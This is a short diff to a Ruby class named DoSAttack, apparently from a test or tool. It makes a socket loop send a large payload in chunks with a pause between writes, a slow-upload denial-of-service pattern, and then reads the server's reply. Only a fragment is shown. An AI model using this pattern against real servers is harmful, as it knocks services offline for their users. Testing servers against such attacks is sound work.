@@ -49,7 +49,10 @@ class DoSAttack
     @socks[sock.object_id] = sock
     sock.write(@header)
     sock.write(@payload)
-    (@size / 8192).times{ sock.write(PAYLOAD) }
+    (@size / 8192).times do
+      sock.write(PAYLOAD)
+      sleep 0.1
+    end
     sock.write("\0" * (@size % 8192))
     sock.write("#{NEWLINE}--b--")
     res = sock.readpartial(4096)
